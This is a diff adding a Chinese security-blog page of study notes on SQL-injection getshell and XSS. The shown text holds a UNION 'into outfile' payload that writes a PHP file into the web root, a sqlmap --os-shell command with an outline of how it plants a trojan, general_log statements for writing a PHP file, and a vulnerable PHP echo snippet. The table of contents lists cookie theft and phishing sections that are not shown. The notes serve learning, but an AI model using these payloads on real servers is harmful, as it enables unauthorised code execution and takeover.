@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hexo">
+<title>SQL 注入 Getshell 与 XSS 跨站脚本攻击 - swfk 的安全笔记</title>
+<meta name="description" content="into outfile 写马、日志写马等 SQL 注入 getshell 条件与手法，以及 XSS 的类型、payload 与利用。">
+<meta name="author" content="swfk2154">
+<meta name="keywords" content="AI安全, 网络安全, 大模型安全, LLM安全, 渗透测试, 安全运营">
+<meta name="theme-color" id="theme-color" content="#f8f7f4">
+<link rel="icon" type="image/svg+xml" href="/images/clay-avatar.svg">
+<link rel="apple-touch-icon" href="/icon.png">
+<link rel="canonical" href="https://blogbu2154.site/sql-getshell-and-xss/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL 注入 Getshell 与 XSS 跨站脚本攻击 - swfk 的安全笔记">
+<meta property="og:description" content="into outfile 写马、日志写马等 SQL 注入 getshell 条件与手法，以及 XSS 的类型、payload 与利用。">
+<meta property="og:url" content="https://blogbu2154.site/sql-getshell-and-xss/">
+<meta property="og:site_name" content="swfk 的安全笔记">
+<meta property="og:image" content="/medias/featureimages/21.jpg">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
+<link rel="stylesheet" href="/css/clay.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+
+<script>
+  // 尽早恢复主题，避免首屏闪烁
+  (function () {
+    try {
+      var t = localStorage.getItem('clay-theme') ||
+        (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+      document.documentElement.dataset.theme = t;
+    } catch (e) {
+      document.documentElement.dataset.theme = 'light';
+    }
+  })();
+</script>
+
+
+<body class="">
+  <a class="skip-link" href="#main">跳到正文</a>
+  <header class="site-nav">
+  <nav class="site-nav__pill" aria-label="主导航">
+    
+      
+        <a href="/" class="">首页</a>
+      
+        <a href="/archives" class="">归档</a>
+      
+        <a href="/categories" class="">分类</a>
+      
+        <a href="/tags" class="">标签</a>
+      
+        <a href="/about" class="">关于</a>
+      
+    
+    
+      <button type="button" class="site-nav__icon" data-search-open aria-label="站内搜索">
+        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </button>
+      <a class="site-nav__icon" href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+        <svg class="icon-github" viewBox="0 0 24 24" width="26" height="26" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+      </a>
+    
+    <button type="button" class="site-nav__icon theme-toggle" data-theme-toggle aria-label="切换主题">
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg>
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+    </button>
+  </nav>
+</header>
+
+  <main id="main">
+    
+<div class="reading-progress" aria-hidden="true"><span data-reading-progress></span></div>
+<article class="article article--toc">
+  <div class="article__body">
+    
+
+<aside class="article__aside">
+  <div class="toc-box">
+    <div class="toc-box__title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-into-outfile-%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6"><span class="toc-text">1 into outfile 导出文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-%E2%80%93os-shell"><span class="toc-text">sqlmap –os-shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-text">利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E8%84%9A%E6%9C%AC%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-text">选择脚本类型：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E7%9B%AE%E5%BD%95%EF%BC%9A"><span class="toc-text">选择目录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%A8-%E2%80%93os-shell-%E5%8E%9F%E7%90%86-v-3-%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0%E5%8E%9F%E7%90%86"><span class="toc-text">✨ –os-shell 原理 (-v 3 即可看到原理)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9Ainto-dumpfile-%E5%AF%BC%E5%87%BA%E9%9A%8F%E6%9C%BA%E6%96%87%E4%BB%B6-var-www-html-tmpuvcou-php%EF%BC%8C%E6%98%AF%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%99%A8"><span class="toc-text">第一步：into dumpfile 导出随机文件 &#x2F;var&#x2F;www&#x2F;html&#x2F;tmpuvcou.php，是一个文件上传器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%86%99%E5%85%A5php%E6%9C%A8%E9%A9%AC-var-www-html-tmpbnvhg-php"><span class="toc-text">第二步：写入php木马 &#x2F;var&#x2F;www&#x2F;html&#x2F;tmpbnvhg.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4-%EF%BC%88%E5%8F%AF%E8%83%BD%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-text">第三步：执行命令 （可能无回显）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9Aexit%E9%80%80%E5%87%BA%EF%BC%8C%E8%87%AA%E5%8A%A8%E6%B8%85%E9%99%A4%E6%96%87%E4%BB%B6-%EF%BC%88%E5%8F%AF%E8%83%BD%E6%B8%85%E4%B8%8D%E6%8E%89%EF%BC%89"><span class="toc-text">第四步：exit退出，自动清除文件 （可能清不掉）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-mysql-%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6"><span class="toc-text">2  mysql 查询日志导出文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%99%BB%E5%BD%95%E5%88%B0-mysql-%E5%90%8E%E5%8F%B0-phpmyadmin"><span class="toc-text">1  登录到 mysql 后台   (phpmyadmin)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B-secure-file-priv-%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">2  查看 secure-file-priv 是否为空字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8Bmysql%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF"><span class="toc-text">3  查看mysql查询日志是否开启</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Cmysql%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E6%98%AF%E5%85%B3%E9%97%AD%E7%9A%84%EF%BC%8C%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E6%89%93%E5%BC%80"><span class="toc-text">如果mysql查询日志是关闭的，需要手动打开</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BF%AE%E6%94%B9%E6%97%A5%E5%BF%97%E7%9A%84%E4%BF%9D%E5%AD%98%E8%B7%AF%E5%BE%84%E4%B8%BAphp%E7%BD%91%E7%AB%99%E6%89%80%E5%9C%A8%E8%B7%AF%E5%BE%84"><span class="toc-text">4  修改日志的保存路径为php网站所在路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%97%A5%E5%BF%97%E4%BC%9A%E8%A2%AB%E4%BF%9D%E5%AD%98%E5%88%B0-var-www-html-han-php-%E6%96%87%E4%BB%B6%E4%B8%AD"><span class="toc-text">5  进行查询，查询的日志会被保存到 &#x2F;var&#x2F;www&#x2F;html&#x2F;han.php 文件中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">6 访问日志文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-text">XSS 跨站脚本攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%8E%98"><span class="toc-text">挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-text">白盒测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-%E7%9C%8B%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E7%9A%84%E5%86%85%E5%AE%B9%E6%9C%89%E6%B2%A1%E6%9C%89%E7%9B%B4%E6%8E%A5%E8%BE%93%E5%87%BA"><span class="toc-text">方法: 看用户输入的内容有没有直接输出</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-text">黑盒测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-text">方法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-%E9%9A%8F%E6%9C%BA%E5%A4%8D%E5%88%B610-20%E8%A1%8C-xss-payload"><span class="toc-text">方法2 随机复制10-20行 xss payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-text">DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-playload"><span class="toc-text">常见的 playload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-script-%E6%A0%87%E7%AD%BE"><span class="toc-text">1 script 标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-a-%E6%A0%87%E7%AD%BE"><span class="toc-text">2 a 标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-text">3 事件类型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AA%83%E5%8F%96cookie"><span class="toc-text">窃取cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BC%B9%E7%AA%97"><span class="toc-text">1 弹窗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-HTTP-%E5%A4%96%E5%B8%A6%E8%8E%B7%E5%8F%96-Cookie-img-%E6%A0%87%E7%AD%BE"><span class="toc-text">2 HTTP 外带获取 Cookie (img 标签)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85"><span class="toc-text">攻击者</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%BC%96%E5%86%99-exp-js"><span class="toc-text">1  编写 exp.js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC"><span class="toc-text">2  开启监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E8%80%85%E4%BD%BF%E7%94%A8-payload-%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99-%E6%89%93-xss-%E6%BC%8F%E6%B4%9E"><span class="toc-text">3  攻击者使用 payload 攻击目标网站  (打 xss 漏洞)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B%E7%BB%93%E6%9D%9F%EF%BC%8C%E8%80%90%E5%BF%83%E7%AD%89%E5%BE%85%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%8A%E9%92%A9"><span class="toc-text">4  攻击过程结束，耐心等待受害者上钩</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%A6%82%E6%9E%9C%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%8A%E9%92%A9%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%91%E5%90%AC%E7%9A%84HTTP%E6%97%A5%E5%BF%97%E4%B8%AD%E7%9C%8B%E5%88%B0%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84cookie"><span class="toc-text">5  如果受害者上钩，攻击者即可在监听的HTTP日志中看到受害者的cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85"><span class="toc-text">受害者</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85%E7%99%BB%E5%BD%95%E8%87%AA%E5%B7%B1%E7%9A%84%E8%B4%A6%E5%8F%B7"><span class="toc-text">受害者登录自己的账号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8B%BF%E5%88%B0cookie%E5%90%8E%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-text">3 拿到cookie后怎么办</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2%E3%80%81%E5%88%B7%E6%96%B0"><span class="toc-text">替换、刷新</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">1  过滤常见关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-HTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-text">2   HTML实体编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%B5%8F%E8%A7%88%E5%99%A8-Cookie-%E5%B1%9E%E6%80%A7"><span class="toc-text">3  浏览器 Cookie 属性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XSS-%E5%B9%B3%E5%8F%B0"><span class="toc-text">利用XSS-平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#beef"><span class="toc-text">beef</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B"><span class="toc-text">安装过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BF%AE%E6%94%B9-beef-%E6%BA%90%E4%BB%A3%E7%A0%81-config-yaml-%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-text">1  修改 beef 源代码 config.yaml 中的用户名和密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F"><span class="toc-text">2 构建镜像</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8"><span class="toc-text">3 启动容器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%AE%BF%E9%97%AE-beef"><span class="toc-text">4 访问 beef</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-text">使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-text">劫持浏览器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flash-%E6%9B%B4%E6%96%B0%E9%92%93%E9%B1%BC"><span class="toc-text">flash 更新钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#google-gmail-%E9%92%93%E9%B1%BC"><span class="toc-text">google gmail 钓鱼</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSSReceiver"><span class="toc-text">XSSReceiver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B-1"><span class="toc-text">安装过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-1"><span class="toc-text">使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-text">获取信息</span></a></li></ol></li></ol>
+  </div>
+</aside>
+
+
+    <div class="article__main">
+      <header class="article__header reveal">
+        <p class="eyebrow">网络安全</p>
+        <h1>SQL 注入 Getshell 与 XSS 跨站脚本攻击</h1>
+        <div class="post-meta">
+          <time datetime="2025-12-08">2025-12-08</time>
+          
+            <span>更新于 2026-08-29</span>
+          
+        </div>
+      </header>
+      
+        <figure class="article__cover reveal"><img src="/medias/featureimages/21.jpg" alt="SQL 注入 Getshell 与 XSS 跨站脚本攻击" loading="eager" onerror="this.parentElement.style.display='none'"></figure>
+      
+      <div class="post-content reveal">
+        <blockquote>
+<p>本篇整理自我的语雀学习笔记（课堂学习与实操记录），已转为纯文字版并按博客格式排版。</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="1-into-outfile-导出文件"><a href="#1-into-outfile-导出文件" class="headerlink" title="1 into outfile 导出文件"></a>1 into outfile 导出文件</h2><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p><code>-1&#39; union select &quot;&lt;?php phpinfo();?&gt;&quot;,2 into outfile &quot;/var/www/html/han.php&quot;#</code></p>
+<p> 解释：把 字符串保存到<code> /var/www/html/han.php</code> 文件中</p>
+<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>1 网站<strong>必须</strong> 使用了 <strong>mysql root 用户</strong></p>
+<p>2 要找到网站保存的绝对路径，且路径有<strong>写权限</strong></p>
+<p>3 mysql 配置项 secure-file-priv 必须是<strong>空字符串</strong></p>
+<p><code>**secure-file-priv=&quot;&quot;**</code></p>
+<p>** secure-file-priv 配置项详细解释：  **</p>
+<ul>
+<li>** 不允许mysql导出文件  **</li>
+</ul>
+<p><code>secure-file-priv=NULL   或   secure-file-priv=  </code></p>
+<ul>
+<li>允许mysql导出文件到指定目录</li>
+</ul>
+<p> <code>secure-file-priv=/var/lib/mysql  </code></p>
+<ul>
+<li>允许mysql导出文件<strong>到任意目录</strong></li>
+</ul>
+<p><code>secure-file-priv=&quot;&quot;</code></p>
+<h2 id="sqlmap-–os-shell"><a href="#sqlmap-–os-shell" class="headerlink" title="sqlmap –os-shell"></a>sqlmap –os-shell</h2><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p><code>python   sqlmap.py -r   绝对路径  -p username  --os-shell </code></p>
+<h3 id="选择脚本类型："><a href="#选择脚本类型：" class="headerlink" title="选择脚本类型："></a>选择脚本类型：</h3><h3 id="选择目录："><a href="#选择目录：" class="headerlink" title="选择目录："></a>选择目录：</h3><h3 id="✨-–os-shell-原理-v-3-即可看到原理"><a href="#✨-–os-shell-原理-v-3-即可看到原理" class="headerlink" title="✨ –os-shell 原理 (-v 3 即可看到原理)"></a>✨ –os-shell 原理 (-v 3 即可看到原理)</h3><h4 id="第一步：into-dumpfile-导出随机文件-var-www-html-tmpuvcou-php，是一个文件上传器"><a href="#第一步：into-dumpfile-导出随机文件-var-www-html-tmpuvcou-php，是一个文件上传器" class="headerlink" title="第一步：into dumpfile 导出随机文件 &#x2F;var&#x2F;www&#x2F;html&#x2F;tmpuvcou.php，是一个文件上传器"></a>第一步：into dumpfile 导出随机文件 &#x2F;var&#x2F;www&#x2F;html&#x2F;tmpuvcou.php，是一个文件上传器</h4><p>⚠️  into outfile 是把字符串导出到文件中， into dumpfile 是把字节码（hex码）导出到文件中</p>
+<h4 id="第二步：写入php木马-var-www-html-tmpbnvhg-php"><a href="#第二步：写入php木马-var-www-html-tmpbnvhg-php" class="headerlink" title="第二步：写入php木马 &#x2F;var&#x2F;www&#x2F;html&#x2F;tmpbnvhg.php"></a>第二步：写入php木马 &#x2F;var&#x2F;www&#x2F;html&#x2F;tmpbnvhg.php</h4><h4 id="第三步：执行命令-（可能无回显）"><a href="#第三步：执行命令-（可能无回显）" class="headerlink" title="第三步：执行命令 （可能无回显）"></a>第三步：执行命令 （可能无回显）</h4><h4 id="第四步：exit退出，自动清除文件-（可能清不掉）"><a href="#第四步：exit退出，自动清除文件-（可能清不掉）" class="headerlink" title="第四步：exit退出，自动清除文件 （可能清不掉）"></a>第四步：exit退出，自动清除文件 （可能清不掉）</h4><h2 id="2-mysql-查询日志导出文件"><a href="#2-mysql-查询日志导出文件" class="headerlink" title="2  mysql 查询日志导出文件"></a>2  mysql 查询日志导出文件</h2><h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="1-登录到-mysql-后台-phpmyadmin"><a href="#1-登录到-mysql-后台-phpmyadmin" class="headerlink" title="1  登录到 mysql 后台   (phpmyadmin)"></a>1  登录到 mysql 后台   (phpmyadmin)</h3><h3 id="2-查看-secure-file-priv-是否为空字符串"><a href="#2-查看-secure-file-priv-是否为空字符串" class="headerlink" title="2  查看 secure-file-priv 是否为空字符串"></a>2  查看 secure-file-priv 是否为空字符串</h3><p><code>**空字符串，说明可以 导出文件到任意位置**</code></p>
+<h3 id="3-查看mysql查询日志是否开启"><a href="#3-查看mysql查询日志是否开启" class="headerlink" title="3  查看mysql查询日志是否开启"></a>3  查看mysql查询日志是否开启</h3><p><code>SHOW VARIABLES LIKE &quot;%general_log%&quot;</code></p>
+<h4 id="如果mysql查询日志是关闭的，需要手动打开"><a href="#如果mysql查询日志是关闭的，需要手动打开" class="headerlink" title="如果mysql查询日志是关闭的，需要手动打开"></a>如果mysql查询日志是关闭的，需要手动打开</h4><p><code>SET GLOBAL GENERAL_log = &quot;on&quot;</code></p>
+<h3 id="4-修改日志的保存路径为php网站所在路径"><a href="#4-修改日志的保存路径为php网站所在路径" class="headerlink" title="4  修改日志的保存路径为php网站所在路径"></a>4  修改日志的保存路径为php网站所在路径</h3><p><code>SET GLOBAL GENERAL_log_file = &quot;/var/www/html/han.php&quot;</code></p>
+<h3 id="5-进行查询，查询的日志会被保存到-var-www-html-han-php-文件中"><a href="#5-进行查询，查询的日志会被保存到-var-www-html-han-php-文件中" class="headerlink" title="5  进行查询，查询的日志会被保存到 &#x2F;var&#x2F;www&#x2F;html&#x2F;han.php 文件中"></a>5  进行查询，查询的日志会被保存到 &#x2F;var&#x2F;www&#x2F;html&#x2F;han.php 文件中</h3><p><code>SELECT &quot;&lt;?php phpinfo();?&gt;&quot;</code></p>
+<h3 id="6-访问日志文件"><a href="#6-访问日志文件" class="headerlink" title="6 访问日志文件"></a>6 访问日志文件</h3><h2 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS 跨站脚本攻击"></a>XSS 跨站脚本攻击</h2><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>后端开发没有对用户传入的参数 做严格的限制与过滤，并直接输出了用户传入的参数，导致用户传入的参数被浏览器 当做** java script 执行**</p>
+<p><strong>XSS ：cross  site  script&#x3D;&gt;css&#x3D;&gt;xss</strong></p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><pre><code class="hljs plain">窃取浏览器端的敏感信息(一般是指浏览器中保存的cookie)
+获取浏览器的其他信息
+劫持浏览器
+getshell,在服务器中执行命令(只在 javascript 充当服务器编程语言时[如 node.js 、bun]，
+才可能产生该危害)
+
+Node.js 是一个基于 V8 引擎的 JavaScript 运行时环境，2009 年由 Ryan Dahl 创建,
+让 JS 可以在浏览器外执行，通常用于开发后端服务、CLI 工具等
+Bun 是 2021 年推出的 JavaScript 运行时，旨在替代 Node.js。它使用 JavaScriptCore
+引擎（来自 Safari），内置打包、转译、包管理等功能，追求更快的启动速度和执行效率。</code></pre>
+
+<h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>实际工作中，xss 都是黑盒扫描器扫出的，很少遇到代码审计</p>
+<h4 id="方法-看用户输入的内容有没有直接输出"><a href="#方法-看用户输入的内容有没有直接输出" class="headerlink" title="方法: 看用户输入的内容有没有直接输出"></a>方法: 看用户输入的内容有没有直接输出</h4><pre><code class="hljs php"><span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;keyword&#x27;</span>];
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;搜索结果：&lt;strong&gt;<span class="hljs-subst">$keyword</span>&lt;/strong&gt;&quot;</span>;</code></pre>
+
